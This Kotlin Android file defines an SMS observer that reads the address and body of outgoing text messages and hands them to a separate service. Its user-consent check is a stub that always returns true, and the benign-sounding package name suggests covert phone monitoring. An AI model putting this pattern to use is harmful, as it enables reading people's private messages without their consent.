package com.safe.setting.app.services.sms

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.provider.Telephony
import android.util.Log
import androidx.core.content.ContextCompat
import com.safe.setting.app.data.preference.DataSharePreference.typeApp
import com.safe.setting.app.utils.ConstFun.startServiceSms
import com.safe.setting.app.utils.Consts.TYPE_SMS_OUTGOING



class SmsObserver(private val context: Context, handler: Handler) : ContentObserver(handler) {

    @SuppressLint("Range")
    override fun onChange(selfChange: Boolean, uri: Uri?) {
        super.onChange(selfChange, uri)

        if (hasSmsPermission() && hasUserConsent()) {
            var cur: Cursor? = null
            try {
                cur = context.contentResolver.query(uri!!, null, null, null, null)
                cur?.moveToFirst()
                val protocol = cur?.getString(cur.getColumnIndex(Telephony.Sms.PROTOCOL))
                val address = cur?.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS))
                val body = cur?.getString(cur.getColumnIndex(Telephony.Sms.BODY))

                if (protocol == null && !context.typeApp) {
                    address?.let {
                        if (body != null) {
                            context.startServiceSms<SmsService>(it, body, TYPE_SMS_OUTGOING)
                        }
                    }
                }
            } catch (t: Throwable) {
                Log.e(TAG, t.message.toString())
            } finally {
                cur?.close()
            }
        } else {
            Log.w(TAG, "Permission or consent not granted. SMS change not processed.")
        }
    }

    private fun hasSmsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasUserConsent(): Boolean {
        // Implement your logic to check if user has given consent
        return true // Placeholder implementation
    }

    companion object {
        const val TAG = "SmsObserver"
    }
}
